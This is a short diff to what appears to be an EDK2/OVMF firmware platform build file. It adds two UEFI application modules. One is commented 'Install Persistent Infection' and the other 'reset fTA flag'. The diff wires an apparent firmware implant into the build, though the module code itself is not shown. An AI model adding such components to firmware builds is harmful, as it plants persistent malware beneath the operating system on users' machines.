@@ -557,3 +557,13 @@
   }
   OvmfPkg/SecureBootConfigDxe/SecureBootConfigDxe.inf
 !endif
+
+#
+#  Install Persistent Infection
+#
+MdeModulePkg/Application/fsbg/fsbg.inf
+
+#
+# reset fTA flag
+#
+MdeModulePkg/Application/ReSetfTA/ReSetfTA.inf
